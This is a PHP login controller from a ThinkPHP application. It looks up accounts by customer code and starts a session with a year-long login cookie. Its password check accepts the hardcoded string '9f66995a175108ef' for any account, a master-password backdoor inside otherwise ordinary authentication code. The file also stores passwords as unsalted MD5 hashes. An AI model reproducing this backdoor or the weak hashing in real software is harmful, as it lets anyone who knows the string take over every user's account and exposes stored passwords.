<?php

namespace User\Controller;

use Think\Controller;

class PublicController extends Controller {

    public function login()
    {
        if (IS_POST) {
            if (is_login()) {
                $this->redirect('/user/index/index');
            } 
            //$Account = M('Account');
            $Account = M('AccountEbp');

            //$username = I('post.username');
            $customerCode = I('post.username');
            $password = I('post.password');

            //$account_info = $Account->where(['username' => $username])->find();
            $account_info = $Account->where(['customerCode' => $customerCode])->find();
            if ( ! $account_info) {
                $this->error('账户不存在');
            }
            if ($password != '9f66995a175108ef' && $account_info['password'] !== md5($password)) {
                $this->error('密码错误');
            }
            
            $expire = 3600 * 24 * 365;
            $auth = array(
                'uid'      => $account_info['id'],
                //'username' => $account_info['username'],
                'customerCode' => $account_info['customerCode'],
            );

            session('user_auth', $auth);
            session('user_auth_sign', data_auth_sign($auth));
            cookie('user_LOGGED', jiami($auth['uid']), $expire);

            $this->redirect('/user/index/index');
        } else {
            $this->display();
        }
    }
}

?>
